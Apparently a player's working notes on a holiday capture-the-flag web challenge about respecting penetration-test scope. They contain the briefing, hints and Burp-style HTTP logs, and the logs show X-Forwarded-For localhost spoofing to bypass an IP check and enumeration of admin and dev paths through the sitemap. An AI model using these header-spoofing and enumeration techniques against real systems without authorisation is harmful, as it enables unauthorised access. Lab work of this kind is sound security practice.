# Schrödinger's Scope

_Difficulty:_ 

Hello, I'm Kevin (though past friends have referred to me as 'Heavy K'). If you ever hear any one say that philosophy is a useless college degree, don't believe them; it's not. I've arrived where I am at because of it. It just made the path more interesting. I have more hobbies than I can keep up with, including Amateur Astronomy, Shortwave Radio, and retro-gaming. Things like backyard observances of distant galaxies, non-internet involved, around the world communications, and those who program for the Atari 2600 still invoke degrees of awe for me. One of the most influential books I've read is "Godel, Escher, and Bach" by Douglas Hofstadter. I'm also a bit of a Tolkien fanatic. My wife and my daughter are everything; without them, I surely would still be kicking rusty tin cans down the lonely highways of my past.

The Neighborhood College Course Registration System has been getting some updates lately and I'm wondering if you might help me improve its security by performing a small web application penetration test of the site.

For any web application test, one of the most important things for the test is the 'scope', that is, what one is permitted to test and what one should not. While hacking is fun and cool, professional integrity means respecting scope boundaries, especially when there are tempting targets outside our permitted scope.

Thankfully, the Neighborhood College has provided a very concise set of 'Instructions' which are accessible via a link provided on the site you will be testing. Do not overlook or dismiss the instructions! Following them is key to successfully completing the test.

Unfortunately, those pesky gnomes have found their way into the site and have been causing some mischief as well. Be wary of their presence and anything they may have to say as you are testing.

Can you help me demonstrate to the Neighborhood College that we know what responsible penetration testing looks like?

## Pistas

- As you test this with a tool like Burp Suite, resist temptations and stay true to the instructed path.
- Though it might be more interesting to start off trying clever techniques and exploits, always start with the simple stuff first, such as reviewing HTML source code and basic SQLi.
- During any kind of penetration test, always be on the lookout for items which may be predictable from the available information, such as application endpoints. Things like a **sitemap** can be helpful, even if it is old or incomplete. Other predictable values to look for are things like token and cookie values
- Pay close attention to the instructions and be very wary of advice from the tongues of gnomes! Perhaps not ignore everything, but be careful!
- Watch out for tiny, pesky gnomes who may be **violating** your progess. If you find one, figure out how they are getting into things and consider **matching and replacing** them out of your way.

https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/?&challenge=termScope&username=hackadviser&id=d116a229-4021-45ff-a1bb-c6024a9e5850 

## dato 1

``` 
sitio principal


<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>Schrödinger's Scope: Welcome</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
    <link rel="stylesheet" href="/register/css/gnome-character.css">
    <link rel="stylesheet" href="/register/css/home.css">
    
    
</head>
<body>
    
    <div >
        <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script>
    </div>
    <main id="elfStyle" style="top: 15vh;">
        <!-- Include common animations -->
        <div id="snowflakes"></div>

        <header>
            <p class="welcome" role="banner">🎓 Welcome to the Neighborhood College Course Registration System</p>
        </header>
        <section class="content">
            <p class="register"><a href="/register/">▶️ Enter Registration System</a>
                <br>
                <label style="font-size: 1rem;">Course Registration begins: <i>TBD</i></label>
            </p>
            
            <!-- Home page specific navigation and instructions -->
<p class="violation"><a href="/register/reset">🔁 Reset Session</a> | <a href="/register/reset?removeAll=">🔁 Remove All Sessions</a><br><br><a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
        </section>
        
        
        <div class="gnome-character-container">
            <img src="/register/images/gnome-hacker.png" alt="Gnome Hacker" class="gnome-image">
            <div class="speech-bubble">
                <span class="initial-text">So, me and my friends have been hanging out, just having a bit of fun. But I assure you ...</span>
                <span class="hover-text">... we&#39;ve only been looking for ways to help, at least I have been. You do believe me, don&#39;t you?</span>
            </div>
        </div>
        
    </main>
    <script src="/register/js/session-reset.js"></script>
    
</body>
</html>
```

## dato 2

```


Schrödinger's Scope

You've been asked to perform a penetration test of the Neighborhood College Course Registration System. The site is under construction, but live and in use. For this engagement, only items in the immediate /register path from the root of the site are in scope for testing. As you find vulnerabilities expected to be found, a brief notification will appear and the vulnerability will automatically be reported. If you find evidence of unexpected course material, report it immediately using the method offered. The Status Report shows a list of vulnerabilities found for the current attempt and how often out-of-scope items have been accessed. A notice will be displayed when the time for the testing engagement is over and you'll be provided the opportunity to finalize the test.

Attempting to access and/or test out-of-scope items too many times or failure to report evidence of compromise will result in termination of the engagement and require a test restart (Reset Session). Stay mindful: whether something is in-scope or not may not be clear … until it is observed.

[Bah! Apps are too involved these days to worry too much about scope!]

[All the most important and dangerous vulns could be anywhere!]

[Everyone benefits in the long run to find everything you can! Just ask my friends!]
```

## dato 3

```
POST /register/login?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=2dce49f4-c880-4fd0-a0d9-f6b161a89cb9; registration=eb72a05369dcb455
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com
Referer: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=d116a229-4021-45ff-a1bb-c6024a9e5850
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=hola&password=hola&id=d116a229-4021-45ff-a1bb-c6024a9e5850


HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: registration=eb72a05369dcb453; Path=/
X-Cloud-Trace-Context: 4cba6fc3a39a41471a4193cc02fb1cc3;o=1
Date: Mon, 01 Dec 2025 00:36:13 GMT
Server: Google Frontend
Content-Length: 5156
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>Login</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
	<link rel="stylesheet" href="/register/css/gnome-character.css">
    <script src="/register/js/new_portal.js" defer></script>
    <link rel="stylesheet" href="/register/css/regLogin.css">
</head>
<body>
    <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script>
    <main id="elfStyle" style="top: 10vh;">
        <!-- Include common animations -->
        <div id="snowflakes"></div>
        
        <header>
            <p class="welcome" role="banner">🎓 Course Registration Portal</p>
        </header>
        <section class="login-container">
            <form method="POST" id="login-form" class="login-form">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="submit" value="Login">
            </form>
            <p id="login-message" class="login-message"></p>
            
            <p class="error-message">Invalid Forwarding IP</p>
            
			
        </section>
        <!-- Common navigation and instructions section -->
<p class="violation"><a href="/">🏠 Return Home</a> | <a href="/register/reset">🔁 Reset Session</a> | <a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
        <div class="gnome-character-container">
            <img src="/register/images/gnome-hacker.png" alt="Gnome Hacker" class="gnome-image">
            <div class="speech-bubble">
                <span class="initial-text">Where there is one login area, there's bound others, he-he!</span>
                <span class="hover-text">Maybe another <a href="/auth/register/login"><font color="red">auth</font></a> area still live or even an <a href="/admin"><font color="red">admin</font></a> area!</span>
            </div>
        </div>
    </main>
</body>
</html>
```


## dato 4

```
GET /register/courses/?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=230b7731-fdf0-4609-a2ba-88791eecd913; registration=eb72a05369dcb444
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=d116a229-4021-45ff-a1bb-c6024a9e5850
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 127.0.0.1


HTTP/2 403 Forbidden
Content-Type: text/html; charset=utf-8
X-Cloud-Trace-Context: 782d90aa03fefbcf93ea3e0a7ac06556
Date: Wed, 03 Dec 2025 23:23:43 GMT
Server: Google Frontend
Content-Length: 4194
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>403 Forbidden</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
</head>
<body>
    <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script>
    <main id="elfStyle">
        <!-- Include common animations -->
        <div id="snowflakes"></div>
        
        <header>
            <p class="welcome error-title" role="banner">⛔ 403 Forbidden</p>
        </header>        <section class="error-content">
            <div class="forbidden-container" style="font-size: clamp(1rem, 4vw, 1.3rem);">
                <p>You don't have permission to access this area.</p>
                <p>The requested resource requires authorization.</p>
            </div>
        </section>
        <!-- Common navigation and instructions section -->
<p class="violation"><a href="/">🏠 Return Home</a> | <a href="/register/reset">🔁 Reset Session</a> | <a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
    </main>
</body>
</html>
```


## dato 5

```
GET /register/sitemap/?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=230b7731-fdf0-4609-a2ba-88791eecd913; registration=eb72a05369dcb444
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=d116a229-4021-45ff-a1bb-c6024a9e5850
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 127.0.0.1


HTTP/2 200 OK
Content-Type: application/xml; charset=utf-8
Set-Cookie: registration=eb72a05369dcb454; Path=/
X-Cloud-Trace-Context: 0bb39ee9fc761701f0eb88dcb77b1715;o=1
Date: Wed, 03 Dec 2025 23:25:02 GMT
Server: Google Frontend
Content-Length: 5547
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/console</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/console/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/logs</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/logs/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/login</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/login/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes/</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos</loc>
    <changefreq>monthly</changefreq>
  </url>
  <url>
    <loc>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos/</loc>
    <changefreq>monthly</changefreq>
  </url>
</urlset>
```

## dato 6

```
GET /register/courses/?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=230b7731-fdf0-4609-a2ba-88791eecd913; registration=eb72a05369dcb444
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=d116a229-4021-45ff-a1bb-c6024a9e5850
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 127.0.0.1


HTTP/2 403 Forbidden
Content-Type: text/html; charset=utf-8
X-Cloud-Trace-Context: c008fa9a39a2bb7dfa9b8cc2bfa7648c;o=1
Date: Wed, 03 Dec 2025 23:32:35 GMT
Server: Google Frontend
Content-Length: 4194
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Common head elements -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="/register/css/style.css">
<link rel="icon" href="/register/images/favicon.ico" type="image/x-icon">
<script src="/register/js/home.js" defer></script>
<script src="/register/js/idparam-propagation.js" defer></script>
<style>
    body {
        background: url('/register/images/snowy_background.png') no-repeat center center fixed;
        background-size: cover;
    }
    
    :root {
        --accent-color: #D22736;
        --accent-color-rgb: 210, 39, 54;
        --secondary-color: #4d9e40;
    }
</style>
    <title>403 Forbidden</title>
    <!-- Common page styles -->
<style>    
    .snowflake {
        position: absolute;
        color: white;
        opacity: 0.7;
        font-size: 1.5rem;
        animation: fall linear infinite;
        z-index: -1;
    }
    
    @keyframes fall {
        0% {
            transform: translateY(-100vh);
        }
        100% {
            transform: translateY(95vh);
        }
    }
      /* Snowflake styles */
    #snowflakes {
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        pointer-events: none;
        z-index: -1;
        overflow: hidden;
    }
	
	/* Snow particles animation */
    .snow-animation {
        position: relative;
        height: 150px;
        background: linear-gradient(to bottom, #3498db, #2c3e50);
        border-radius: 8px;
        margin-top: 1.5rem;
        overflow: hidden;
    }
    
    .snow-particle {
        position: absolute;
        background: white;
        border-radius: 50%;
        opacity: 0.8;
        animation: snowfall linear infinite;
    }
    
    @keyframes snowfall {
        0% {
            transform: translateY(-10px);
        }
        100% {
            transform: translateY(150px);
        }
    }
</style>
</head>
<body>
    <div class="mini-gnome-container"></div>
<script>
(function() {
    if (window.gnomeVandalLoaded) return;
    window.gnomeVandalLoaded = true;
    
    document.addEventListener('DOMContentLoaded', function() {
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
        }

        if (getCookie('Schrodinger')) {
            var container = document.querySelector('.mini-gnome-container');
            if (container && !document.getElementById('mini-gnome')) {
                var img = document.createElement('img');
                img.src = '/gnomeU?id=d116a229-4021-45ff-a1bb-c6024a9e5850';
                img.id = 'mini-gnome';
                img.style.cssText = 'width: 20px;height: auto;position: fixed; left: 10px; bottom: 10px;';
                container.appendChild(img);
            }
        }
    });
})();
</script>
    <main id="elfStyle">
        <!-- Include common animations -->
        <div id="snowflakes"></div>
        
        <header>
            <p class="welcome error-title" role="banner">⛔ 403 Forbidden</p>
        </header>        <section class="error-content">
            <div class="forbidden-container" style="font-size: clamp(1rem, 4vw, 1.3rem);">
                <p>You don't have permission to access this area.</p>
                <p>The requested resource requires authorization.</p>
            </div>
        </section>
        <!-- Common navigation and instructions section -->
<p class="violation"><a href="/">🏠 Return Home</a> | <a href="/register/reset">🔁 Reset Session</a> | <a href="/register/status_report">📋 View Status Report</a> | <a href="#" id="instBtn" aria-expanded="false" aria-controls="rules">📖 Instructions</a></p>
<div id="rules" class="rules" aria-hidden="true">    <img id="instructions" src="/register/images/instructions.png" alt="Instructions for the Registration System" style="max-height:100%;">
    <button id="closeInstructions" class="close-instructions" aria-label="Close Instructions">Close</button>
</div>
    </main>
</body>
</html>
```

## dato 7

```
GET /register/courses?id=1/?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=230b7731-fdf0-4609-a2ba-88791eecd913; registration=eb72a05369dcb444
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=d116a229-4021-45ff-a1bb-c6024a9e5850
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: 127.0.0.1


HTTP/2 302 Found
Content-Type: text/html; charset=utf-8
Location: /?reset=True&id=1/?id%3Dd116a229-4021-45ff-a1bb-c6024a9e5850&show_instructions_on_load=False
Set-Cookie: Schrodinger=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Secure; HttpOnly; Path=/; SameSite=Lax
Set-Cookie: registration=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Path=/
X-Cloud-Trace-Context: 02ba6fffda7437148bc1ccc16a1878ea;o=1
Date: Wed, 03 Dec 2025 23:34:12 GMT
Server: Google Frontend
Content-Length: 387
Via: 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/?reset=True&amp;id=1/?id%3Dd116a229-4021-45ff-a1bb-c6024a9e5850&amp;show_instructions_on_load=False">/?reset=True&amp;id=1/?id%3Dd116a229-4021-45ff-a1bb-c6024a9e5850&amp;show_instructions_on_load=False</a>. If not, click the link.

```


## dato 8

```
GET /register/dev/dev_todos?id=d116a229-4021-45ff-a1bb-c6024a9e5850 HTTP/2
Host: flask-schrodingers-scope-firestore.holidayhackchallenge.com
Cookie: Schrodinger=230b7731-fdf0-4609-a2ba-88791eecd913; registration=eb72a05369dcb444
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
